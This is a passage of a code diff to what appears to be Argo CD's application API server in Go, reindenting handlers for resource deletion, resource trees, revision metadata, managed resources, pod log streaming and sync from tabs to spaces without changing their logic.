q.Name,\n-\t\tAppNamespace: q.AppNamespace,\n-\t\tNamespace:    q.Namespace,\n-\t\tResourceName: q.ResourceName,\n-\t\tKind:         q.Kind,\n-\t\tVersion:      q.Version,\n-\t\tGroup:        q.Group,\n-\t\tProject:      q.Project,\n-\t}\n-\tres, config, a, err := s.getAppLiveResource(ctx, rbacpolicy.ActionDelete, resourceRequest)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tvar deleteOption metav1.DeleteOptions\n-\tif q.GetOrphan() {\n-\t\tpropagationPolicy := metav1.DeletePropagationOrphan\n-\t\tdeleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy}\n-\t} else if q.GetForce() {\n-\t\tpropagationPolicy := metav1.DeletePropagationBackground\n-\t\tzeroGracePeriod := int64(0)\n-\t\tdeleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy, GracePeriodSeconds: &zeroGracePeriod}\n-\t} else {\n-\t\tpropagationPolicy := metav1.DeletePropagationForeground\n-\t\tdeleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy}\n-\t}\n-\terr = s.kubectl.DeleteResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace, deleteOption)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error deleting resource: %w\", err)\n-\t}\n-\ts.logAppEvent(a, ctx, argo.EventReasonResourceDeleted, fmt.Sprintf(\"deleted resource %s/%s '%s'\", q.GetGroup(), q.GetKind(), q.GetResourceName()))\n-\treturn &application.ApplicationResponse{}, nil\n+        resourceRequest := &application.ApplicationResourceRequest{\n+                Name:         q.Name,\n+                AppNamespace: q.AppNamespace,\n+                Namespace:    q.Namespace,\n+                ResourceName: q.ResourceName,\n+                Kind:         q.Kind,\n+                Version:      q.Version,\n+                Group:        q.Group,\n+                Project:      q.Project,\n+        }\n+        res, config, a, err := s.getAppLiveResource(ctx, rbacpolicy.ActionDelete, resourceRequest)\n+        if err != nil {\n+                return nil, err\n+        }\n+        var deleteOption metav1.DeleteOptions\n+        if q.GetOrphan() {\n+                propagationPolicy := metav1.DeletePropagationOrphan\n+                deleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy}\n+        } else if q.GetForce() {\n+                propagationPolicy := metav1.DeletePropagationBackground\n+                zeroGracePeriod := int64(0)\n+                deleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy, GracePeriodSeconds: &zeroGracePeriod}\n+        } else {\n+                propagationPolicy := metav1.DeletePropagationForeground\n+                deleteOption = metav1.DeleteOptions{PropagationPolicy: &propagationPolicy}\n+        }\n+        err = s.kubectl.DeleteResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace, deleteOption)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error deleting resource: %w\", err)\n+        }\n+        s.logAppEvent(a, ctx, argo.EventReasonResourceDeleted, fmt.Sprintf(\"deleted resource %s/%s '%s'\", q.GetGroup(), q.GetKind(), q.GetResourceName()))\n+        return &application.ApplicationResponse{}, nil\n }\n \n func (s *Server) ResourceTree(ctx context.Context, q *application.ResourcesQuery) (*appv1.ApplicationTree, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\treturn s.getAppResources(ctx, a)\n+        return s.getAppResources(ctx, a)\n }\n \n func (s *Server) WatchResourceTree(q *application.ResourcesQuery, ws application.ApplicationService_WatchResourceTreeServer) error {\n-\t_, err := s.getApplicationEnforceRBACInformer(ws.Context(), rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tcacheKey := argo.AppInstanceName(q.GetApplicationName(), q.GetAppNamespace(), s.ns)\n-\treturn s.cache.OnAppResourcesTreeChanged(ws.Context(), cacheKey, func() error {\n-\t\tvar tree appv1.ApplicationTree\n-\t\terr := s.cache.GetAppResourcesTree(cacheKey, &tree)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting app resource tree: %w\", err)\n-\t\t}\n-\t\treturn ws.Send(&tree)\n-\t})\n+        _, err := s.getApplicationEnforceRBACInformer(ws.Context(), rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n+        if err != nil {\n+                return err\n+        }\n+\n+        cacheKey := argo.AppInstanceName(q.GetApplicationName(), q.GetAppNamespace(), s.ns)\n+        return s.cache.OnAppResourcesTreeChanged(ws.Context(), cacheKey, func() error {\n+                var tree appv1.ApplicationTree\n+                err := s.cache.GetAppResourcesTree(cacheKey, &tree)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting app resource tree: %w\", err)\n+                }\n+                return ws.Send(&tree)\n+        })\n }\n \n func (s *Server) RevisionMetadata(ctx context.Context, q *application.RevisionMetadataQuery) (*appv1.RevisionMetadata, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tsource := a.Spec.GetSource()\n-\trepo, err := s.db.GetRepository(ctx, source.RepoURL)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting repository by URL: %w\", err)\n-\t}\n-\t// We need to get some information with the project associated to the app,\n-\t// so we'll know whether GPG signatures are enforced.\n-\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting app project: %w\", err)\n-\t}\n-\tconn, repoClient, err := s.repoClientset.NewRepoServerClient()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error creating repo server client: %w\", err)\n-\t}\n-\tdefer ioutil.Close(conn)\n-\treturn repoClient.GetRevisionMetadata(ctx, &apiclient.RepoServerRevisionMetadataRequest{\n-\t\tRepo:           repo,\n-\t\tRevision:       q.GetRevision(),\n-\t\tCheckSignature: len(proj.Spec.SignatureKeys) > 0,\n-\t})\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        source := a.Spec.GetSource()\n+        repo, err := s.db.GetRepository(ctx, source.RepoURL)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting repository by URL: %w\", err)\n+        }\n+        // We need to get some information with the project associated to the app,\n+        // so we'll know whether GPG signatures are enforced.\n+        proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting app project: %w\", err)\n+        }\n+        conn, repoClient, err := s.repoClientset.NewRepoServerClient()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error creating repo server client: %w\", err)\n+        }\n+        defer ioutil.Close(conn)\n+        return repoClient.GetRevisionMetadata(ctx, &apiclient.RepoServerRevisionMetadataRequest{\n+                Repo:           repo,\n+                Revision:       q.GetRevision(),\n+                CheckSignature: len(proj.Spec.SignatureKeys) > 0,\n+        })\n }\n \n // RevisionChartDetails returns the helm chart metadata, as fetched from the reposerver\n func (s *Server) RevisionChartDetails(ctx context.Context, q *application.RevisionMetadataQuery) (*appv1.ChartDetails, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif a.Spec.Source.Chart == \"\" {\n-\t\treturn nil, fmt.Errorf(\"no chart found for application: %v\", a.QualifiedName())\n-\t}\n-\trepo, err := s.db.GetRepository(ctx, a.Spec.Source.RepoURL)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting repository by URL: %w\", err)\n-\t}\n-\tconn, repoClient, err := s.repoClientset.NewRepoServerClient()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error creating repo server client: %w\", err)\n-\t}\n-\tdefer ioutil.Close(conn)\n-\treturn repoClient.GetRevisionChartDetails(ctx, &apiclient.RepoServerRevisionChartDetailsRequest{\n-\t\tRepo:     repo,\n-\t\tName:     a.Spec.Source.Chart,\n-\t\tRevision: q.GetRevision(),\n-\t})\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return nil, err\n+        }\n+        if a.Spec.Source.Chart == \"\" {\n+                return nil, fmt.Errorf(\"no chart found for application: %v\", a.QualifiedName())\n+        }\n+        repo, err := s.db.GetRepository(ctx, a.Spec.Source.RepoURL)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting repository by URL: %w\", err)\n+        }\n+        conn, repoClient, err := s.repoClientset.NewRepoServerClient()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error creating repo server client: %w\", err)\n+        }\n+        defer ioutil.Close(conn)\n+        return repoClient.GetRevisionChartDetails(ctx, &apiclient.RepoServerRevisionChartDetailsRequest{\n+                Repo:     repo,\n+                Name:     a.Spec.Source.Chart,\n+                Revision: q.GetRevision(),\n+        })\n }\n \n func isMatchingResource(q *application.ResourcesQuery, key kube.ResourceKey) bool {\n-\treturn (q.GetName() == \"\" || q.GetName() == key.Name) &&\n-\t\t(q.GetNamespace() == \"\" || q.GetNamespace() == key.Namespace) &&\n-\t\t(q.GetGroup() == \"\" || q.GetGroup() == key.Group) &&\n-\t\t(q.GetKind() == \"\" || q.GetKind() == key.Kind)\n+        return (q.GetName() == \"\" || q.GetName() == key.Name) &&\n+                (q.GetNamespace() == \"\" || q.GetNamespace() == key.Namespace) &&\n+                (q.GetGroup() == \"\" || q.GetGroup() == key.Group) &&\n+                (q.GetKind() == \"\" || q.GetKind() == key.Kind)\n }\n \n func (s *Server) ManagedResources(ctx context.Context, q *application.ResourcesQuery) (*application.ManagedResourcesResponse, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\titems := make([]*appv1.ResourceDiff, 0)\n-\terr = s.getCachedAppState(ctx, a, func() error {\n-\t\treturn s.cache.GetAppManagedResources(a.InstanceName(s.ns), &items)\n-\t})\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting cached app managed resources: %w\", err)\n-\t}\n-\tres := &application.ManagedResourcesResponse{}\n-\tfor i := range items {\n-\t\titem := items[i]\n-\t\tif !item.Hook && isMatchingResource(q, kube.ResourceKey{Name: item.Name, Namespace: item.Namespace, Kind: item.Kind, Group: item.Group}) {\n-\t\t\tres.Items = append(res.Items, item)\n-\t\t}\n-\t}\n-\n-\treturn res, nil\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetApplicationName())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        items := make([]*appv1.ResourceDiff, 0)\n+        err = s.getCachedAppState(ctx, a, func() error {\n+                return s.cache.GetAppManagedResources(a.InstanceName(s.ns), &items)\n+        })\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting cached app managed resources: %w\", err)\n+        }\n+        res := &application.ManagedResourcesResponse{}\n+        for i := range items {\n+                item := items[i]\n+                if !item.Hook && isMatchingResource(q, kube.ResourceKey{Name: item.Name, Namespace: item.Namespace, Kind: item.Kind, Group: item.Group}) {\n+                        res.Items = append(res.Items, item)\n+                }\n+        }\n+\n+        return res, nil\n }\n \n func (s *Server) PodLogs(q *application.ApplicationPodLogsQuery, ws application.ApplicationService_PodLogsServer) error {\n-\tif q.PodName != nil {\n-\t\tpodKind := \"Pod\"\n-\t\tq.Kind = &podKind\n-\t\tq.ResourceName = q.PodName\n-\t}\n-\n-\tvar sinceSeconds, tailLines *int64\n-\tif q.GetSinceSeconds() > 0 {\n-\t\tsinceSeconds = pointer.Int64(q.GetSinceSeconds())\n-\t}\n-\tif q.GetTailLines() > 0 {\n-\t\ttailLines = pointer.Int64(q.GetTailLines())\n-\t}\n-\tvar untilTime *metav1.Time\n-\tif q.GetUntilTime() != \"\" {\n-\t\tif val, err := time.Parse(time.RFC3339Nano, q.GetUntilTime()); err != nil {\n-\t\t\treturn fmt.Errorf(\"invalid untilTime parameter value: %v\", err)\n-\t\t} else {\n-\t\t\tuntilTimeVal := metav1.NewTime(val)\n-\t\t\tuntilTime = &untilTimeVal\n-\t\t}\n-\t}\n-\n-\tliteral := \"\"\n-\tinverse := false\n-\tif q.GetFilter() != \"\" {\n-\t\tliteral = *q.Filter\n-\t\tif literal[0] == '!' {\n-\t\t\tliteral = literal[1:]\n-\t\t\tinverse = true\n-\t\t}\n-\t}\n-\n-\ta, err := s.getApplicationEnforceRBACInformer(ws.Context(), rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Logs RBAC will be enforced only if an internal var serverRBACLogEnforceEnable (representing server.rbac.log.enforce.enable env var)\n-\t// is defined and has a \"true\" value\n-\t// Otherwise, no RBAC enforcement for logs will take place (meaning, PodLogs will return the logs,\n-\t// even if there is no explicit RBAC allow, or if there is an explicit RBAC deny)\n-\tserverRBACLogEnforceEnable, err := s.settingsMgr.GetServerRBACLogEnforceEnable()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting RBAC log enforce enable: %w\", err)\n-\t}\n-\n-\tif serverRBACLogEnforceEnable {\n-\t\tif err := s.enf.EnforceErr(ws.Context().Value(\"claims\"), rbacpolicy.ResourceLogs, rbacpolicy.ActionGet, a.RBACName(s.ns)); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\ttree, err := s.getAppResources(ws.Context(), a)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting app resource tree: %w\", err)\n-\t}\n-\n-\tconfig, err := s.getApplicationClusterConfig(ws.Context(), a)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t}\n-\n-\tkubeClientset, err := kubernetes.NewForConfig(config)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error creating kube client: %w\", err)\n-\t}\n-\n-\t// from the tree find pods which match query of kind, group, and resource name\n-\tpods := getSelectedPods(tree.Nodes, q)\n-\tif len(pods) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\tif len(pods) > maxPodLogsToRender {\n-\t\treturn errors.New(\"Max pods to view logs are reached. Please provide more granular query.\")\n-\t}\n-\n-\tvar streams []chan logEntry\n-\n-\tfor _, pod := range pods {\n-\t\tstream, err := kubeClientset.CoreV1().Pods(pod.Namespace).GetLogs(pod.Name, &v1.PodLogOptions{\n-\t\t\tContainer:    q.GetContainer(),\n-\t\t\tFollow:       q.GetFollow(),\n-\t\t\tTimestamps:   true,\n-\t\t\tSinceSeconds: sinceSeconds,\n-\t\t\tSinceTime:    q.GetSinceTime(),\n-\t\t\tTailLines:    tailLines,\n-\t\t\tPrevious:     q.GetPrevious(),\n-\t\t}).Stream(ws.Context())\n-\t\tpodName := pod.Name\n-\t\tlogStream := make(chan logEntry)\n-\t\tif err == nil {\n-\t\t\tdefer ioutil.Close(stream)\n-\t\t}\n-\n-\t\tstreams = append(streams, logStream)\n-\t\tgo func() {\n-\t\t\t// if k8s failed to start steaming logs (typically because Pod is not ready yet)\n-\t\t\t// then the error should be shown in the UI so that user know the reason\n-\t\t\tif err != nil {\n-\t\t\t\tlogStream <- logEntry{line: err.Error()}\n-\t\t\t} else {\n-\t\t\t\tparseLogsStream(podName, stream, logStream)\n-\t\t\t}\n-\t\t\tclose(logStream)\n-\t\t}()\n-\t}\n-\n-\tlogStream := mergeLogStreams(streams, time.Millisecond*100)\n-\tsentCount := int64(0)\n-\tdone := make(chan error)\n-\tgo func() {\n-\t\tfor entry := range logStream {\n-\t\t\tif entry.err != nil {\n-\t\t\t\tdone <- entry.err\n-\t\t\t\treturn\n-\t\t\t} else {\n-\t\t\t\tif q.Filter != nil {\n-\t\t\t\t\tlineContainsFilter := strings.Contains(entry.line, literal)\n-\t\t\t\t\tif (inverse && lineContainsFilter) || (!inverse && !lineContainsFilter) {\n-\t\t\t\t\t\tcontinue\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tts := metav1.NewTime(entry.timeStamp)\n-\t\t\t\tif untilTime != nil && entry.timeStamp.After(untilTime.Time) {\n-\t\t\t\t\tdone <- ws.Send(&application.LogEntry{\n-\t\t\t\t\t\tLast:         pointer.Bool(true),\n-\t\t\t\t\t\tPodName:      &entry.podName,\n-\t\t\t\t\t\tContent:      &entry.line,\n-\t\t\t\t\t\tTimeStampStr: pointer.String(entry.timeStamp.Format(time.RFC3339Nano)),\n-\t\t\t\t\t\tTimeStamp:    &ts,\n-\t\t\t\t\t})\n-\t\t\t\t\treturn\n-\t\t\t\t} else {\n-\t\t\t\t\tsentCount++\n-\t\t\t\t\tif err := ws.Send(&application.LogEntry{\n-\t\t\t\t\t\tPodName:      &entry.podName,\n-\t\t\t\t\t\tContent:      &entry.line,\n-\t\t\t\t\t\tTimeStampStr: pointer.String(entry.timeStamp.Format(time.RFC3339Nano)),\n-\t\t\t\t\t\tTimeStamp:    &ts,\n-\t\t\t\t\t\tLast:         pointer.Bool(false),\n-\t\t\t\t\t}); err != nil {\n-\t\t\t\t\t\tdone <- err\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\tnow := time.Now()\n-\t\tnowTS := metav1.NewTime(now)\n-\t\tdone <- ws.Send(&application.LogEntry{\n-\t\t\tLast:         pointer.Bool(true),\n-\t\t\tPodName:      pointer.String(\"\"),\n-\t\t\tContent:      pointer.String(\"\"),\n-\t\t\tTimeStampStr: pointer.String(now.Format(time.RFC3339Nano)),\n-\t\t\tTimeStamp:    &nowTS,\n-\t\t})\n-\t}()\n-\n-\tselect {\n-\tcase err := <-done:\n-\t\treturn err\n-\tcase <-ws.Context().Done():\n-\t\tlog.WithField(\"application\", q.Name).Debug(\"k8s pod logs reader completed due to closed grpc context\")\n-\t\treturn nil\n-\t}\n+        if q.PodName != nil {\n+                podKind := \"Pod\"\n+                q.Kind = &podKind\n+                q.ResourceName = q.PodName\n+        }\n+\n+        var sinceSeconds, tailLines *int64\n+        if q.GetSinceSeconds() > 0 {\n+                sinceSeconds = pointer.Int64(q.GetSinceSeconds())\n+        }\n+        if q.GetTailLines() > 0 {\n+                tailLines = pointer.Int64(q.GetTailLines())\n+        }\n+        var untilTime *metav1.Time\n+        if q.GetUntilTime() != \"\" {\n+                if val, err := time.Parse(time.RFC3339Nano, q.GetUntilTime()); err != nil {\n+                        return fmt.Errorf(\"invalid untilTime parameter value: %v\", err)\n+                } else {\n+                        untilTimeVal := metav1.NewTime(val)\n+                        untilTime = &untilTimeVal\n+                }\n+        }\n+\n+        literal := \"\"\n+        inverse := false\n+        if q.GetFilter() != \"\" {\n+                literal = *q.Filter\n+                if literal[0] == '!' {\n+                        literal = literal[1:]\n+                        inverse = true\n+                }\n+        }\n+\n+        a, err := s.getApplicationEnforceRBACInformer(ws.Context(), rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return err\n+        }\n+\n+        // Logs RBAC will be enforced only if an internal var serverRBACLogEnforceEnable (representing server.rbac.log.enforce.enable env var)\n+        // is defined and has a \"true\" value\n+        // Otherwise, no RBAC enforcement for logs will take place (meaning, PodLogs will return the logs,\n+        // even if there is no explicit RBAC allow, or if there is an explicit RBAC deny)\n+        serverRBACLogEnforceEnable, err := s.settingsMgr.GetServerRBACLogEnforceEnable()\n+        if err != nil {\n+                return fmt.Errorf(\"error getting RBAC log enforce enable: %w\", err)\n+        }\n+\n+        if serverRBACLogEnforceEnable {\n+                if err := s.enf.EnforceErr(ws.Context().Value(\"claims\"), rbacpolicy.ResourceLogs, rbacpolicy.ActionGet, a.RBACName(s.ns)); err != nil {\n+                        return err\n+                }\n+        }\n+\n+        tree, err := s.getAppResources(ws.Context(), a)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting app resource tree: %w\", err)\n+        }\n+\n+        config, err := s.getApplicationClusterConfig(ws.Context(), a)\n+        if err != nil {\n+                return fmt.Errorf(\"error getting application cluster config: %w\", err)\n+        }\n+\n+        kubeClientset, err := kubernetes.NewForConfig(config)\n+        if err != nil {\n+                return fmt.Errorf(\"error creating kube client: %w\", err)\n+        }\n+\n+        // from the tree find pods which match query of kind, group, and resource name\n+        pods := getSelectedPods(tree.Nodes, q)\n+        if len(pods) == 0 {\n+                return nil\n+        }\n+\n+        if len(pods) > maxPodLogsToRender {\n+                return errors.New(\"Max pods to view logs are reached. Please provide more granular query.\")\n+        }\n+\n+        var streams []chan logEntry\n+\n+        for _, pod := range pods {\n+                stream, err := kubeClientset.CoreV1().Pods(pod.Namespace).GetLogs(pod.Name, &v1.PodLogOptions{\n+                        Container:    q.GetContainer(),\n+                        Follow:       q.GetFollow(),\n+                        Timestamps:   true,\n+                        SinceSeconds: sinceSeconds,\n+                        SinceTime:    q.GetSinceTime(),\n+                        TailLines:    tailLines,\n+                        Previous:     q.GetPrevious(),\n+                }).Stream(ws.Context())\n+                podName := pod.Name\n+                logStream := make(chan logEntry)\n+                if err == nil {\n+                        defer ioutil.Close(stream)\n+                }\n+\n+                streams = append(streams, logStream)\n+                go func() {\n+                        // if k8s failed to start steaming logs (typically because Pod is not ready yet)\n+                        // then the error should be shown in the UI so that user know the reason\n+                        if err != nil {\n+                                logStream <- logEntry{line: err.Error()}\n+                        } else {\n+                                parseLogsStream(podName, stream, logStream)\n+                        }\n+                        close(logStream)\n+                }()\n+        }\n+\n+        logStream := mergeLogStreams(streams, time.Millisecond*100)\n+        sentCount := int64(0)\n+        done := make(chan error)\n+        go func() {\n+                for entry := range logStream {\n+                        if entry.err != nil {\n+                                done <- entry.err\n+                                return\n+                        } else {\n+                                if q.Filter != nil {\n+                                        lineContainsFilter := strings.Contains(entry.line, literal)\n+                                        if (inverse && lineContainsFilter) || (!inverse && !lineContainsFilter) {\n+                                                continue\n+                                        }\n+                                }\n+                                ts := metav1.NewTime(entry.timeStamp)\n+                                if untilTime != nil && entry.timeStamp.After(untilTime.Time) {\n+                                        done <- ws.Send(&application.LogEntry{\n+                                                Last:         pointer.Bool(true),\n+                                                PodName:      &entry.podName,\n+                                                Content:      &entry.line,\n+                                                TimeStampStr: pointer.String(entry.timeStamp.Format(time.RFC3339Nano)),\n+                                                TimeStamp:    &ts,\n+                                        })\n+                                        return\n+                                } else {\n+                                        sentCount++\n+                                        if err := ws.Send(&application.LogEntry{\n+                                                PodName:      &entry.podName,\n+                                                Content:      &entry.line,\n+                                                TimeStampStr: pointer.String(entry.timeStamp.Format(time.RFC3339Nano)),\n+                                                TimeStamp:    &ts,\n+                                                Last:         pointer.Bool(false),\n+                                        }); err != nil {\n+                                                done <- err\n+                                                break\n+                                        }\n+                                }\n+                        }\n+                }\n+                now := time.Now()\n+                nowTS := metav1.NewTime(now)\n+                done <- ws.Send(&application.LogEntry{\n+                        Last:         pointer.Bool(true),\n+                        PodName:      pointer.String(\"\"),\n+                        Content:      pointer.String(\"\"),\n+                        TimeStampStr: pointer.String(now.Format(time.RFC3339Nano)),\n+                        TimeStamp:    &nowTS,\n+                })\n+        }()\n+\n+        select {\n+        case err := <-done:\n+                return err\n+        case <-ws.Context().Done():\n+                log.WithField(\"application\", q.Name).Debug(\"k8s pod logs reader completed due to closed grpc context\")\n+                return nil\n+        }\n }\n \n // from all of the treeNodes, get the pod who meets the criteria or whose parents meets the criteria\n func getSelectedPods(treeNodes []appv1.ResourceNode, q *application.ApplicationPodLogsQuery) []appv1.ResourceNode {\n-\tvar pods []appv1.ResourceNode\n-\tisTheOneMap := make(map[string]bool)\n-\tfor _, treeNode := range treeNodes {\n-\t\tif treeNode.Kind == kube.PodKind && treeNode.Group == \"\" && treeNode.UID != \"\" {\n-\t\t\tif isTheSelectedOne(&treeNode, q, treeNodes, isTheOneMap) {\n-\t\t\t\tpods = append(pods, treeNode)\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn pods\n+        var pods []appv1.ResourceNode\n+        isTheOneMap := make(map[string]bool)\n+        for _, treeNode := range treeNodes {\n+                if treeNode.Kind == kube.PodKind && treeNode.Group == \"\" && treeNode.UID != \"\" {\n+                        if isTheSelectedOne(&treeNode, q, treeNodes, isTheOneMap) {\n+                                pods = append(pods, treeNode)\n+                        }\n+                }\n+        }\n+        return pods\n }\n \n // check is currentNode is matching with group, kind, and name, or if any of its parents matches\n func isTheSelectedOne(currentNode *appv1.ResourceNode, q *application.ApplicationPodLogsQuery, resourceNodes []appv1.ResourceNode, isTheOneMap map[string]bool) bool {\n-\texist, value := isTheOneMap[currentNode.UID]\n-\tif exist {\n-\t\treturn value\n-\t}\n-\n-\tif (q.GetResourceName() == \"\" || currentNode.Name == q.GetResourceName()) &&\n-\t\t(q.GetKind() == \"\" || currentNode.Kind == q.GetKind()) &&\n-\t\t(q.GetGroup() == \"\" || currentNode.Group == q.GetGroup()) &&\n-\t\t(q.GetNamespace() == \"\" || currentNode.Namespace == q.GetNamespace()) {\n-\t\tisTheOneMap[currentNode.UID] = true\n-\t\treturn true\n-\t}\n-\n-\tif len(currentNode.ParentRefs) == 0 {\n-\t\tisTheOneMap[currentNode.UID] = false\n-\t\treturn false\n-\t}\n-\n-\tfor _, parentResource := range currentNode.ParentRefs {\n-\t\t// look up parentResource from resourceNodes\n-\t\t// then check if the parent isTheSelectedOne\n-\t\tfor _, resourceNode := range resourceNodes {\n-\t\t\tif resourceNode.Namespace == parentResource.Namespace &&\n-\t\t\t\tresourceNode.Name == parentResource.Name &&\n-\t\t\t\tresourceNode.Group == parentResource.Group &&\n-\t\t\t\tresourceNode.Kind == parentResource.Kind {\n-\t\t\t\tif isTheSelectedOne(&resourceNode, q, resourceNodes, isTheOneMap) {\n-\t\t\t\t\tisTheOneMap[currentNode.UID] = true\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tisTheOneMap[currentNode.UID] = false\n-\treturn false\n+        exist, value := isTheOneMap[currentNode.UID]\n+        if exist {\n+                return value\n+        }\n+\n+        if (q.GetResourceName() == \"\" || currentNode.Name == q.GetResourceName()) &&\n+                (q.GetKind() == \"\" || currentNode.Kind == q.GetKind()) &&\n+                (q.GetGroup() == \"\" || currentNode.Group == q.GetGroup()) &&\n+                (q.GetNamespace() == \"\" || currentNode.Namespace == q.GetNamespace()) {\n+                isTheOneMap[currentNode.UID] = true\n+                return true\n+        }\n+\n+        if len(currentNode.ParentRefs) == 0 {\n+                isTheOneMap[currentNode.UID] = false\n+                return false\n+        }\n+\n+        for _, parentResource := range currentNode.ParentRefs {\n+                // look up parentResource from resourceNodes\n+                // then check if the parent isTheSelectedOne\n+                for _, resourceNode := range resourceNodes {\n+                        if resourceNode.Namespace == parentResource.Namespace &&\n+                                resourceNode.Name == parentResource.Name &&\n+                                resourceNode.Group == parentResource.Group &&\n+                                resourceNode.Kind == parentResource.Kind {\n+                                if isTheSelectedOne(&resourceNode, q, resourceNodes, isTheOneMap) {\n+                                        isTheOneMap[currentNode.UID] = true\n+                                        return true\n+                                }\n+                        }\n+                }\n+        }\n+\n+        isTheOneMap[currentNode.UID] = false\n+        return false\n }\n \n // Sync syncs an application to its target state\n func (s *Server) Sync(ctx context.Context, syncReq *application.ApplicationSyncRequest) (*appv1.Application, error) {\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, syncReq.GetProject(), syncReq.GetAppNamespace(), syncReq.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\treturn a, status.Errorf(codes.InvalidArgument, \"application references project %s which does not exist\", a.Spec.Project)\n-\t\t}\n-\t\treturn a, fmt.Errorf(\"error getting app project: %w\", err)\n-\t}\n-\n-\ts.inferResourcesStatusHealth(a)\n-\n-\tif !proj.Spec.SyncWindows.Matches(a).CanSync(true) {\n-\t\treturn a, status.Errorf(codes.PermissionDenied, \"cannot sync: blocked by sync window\")\n-\t}\n-\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionSync, a.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tsource := a.Spec.GetSource()\n-\n-\tif syncReq.Manifests != nil {\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionOverride, a.RBACName(s.ns)); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tif a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil && !syncReq.GetDryRun() {\n-\t\t\treturn nil, status.Error(codes.FailedPrecondition, \"cannot use local sync when Automatic Sync Policy is enabled unless for dry run\")\n-\t\t}\n-\t}\n-\tif 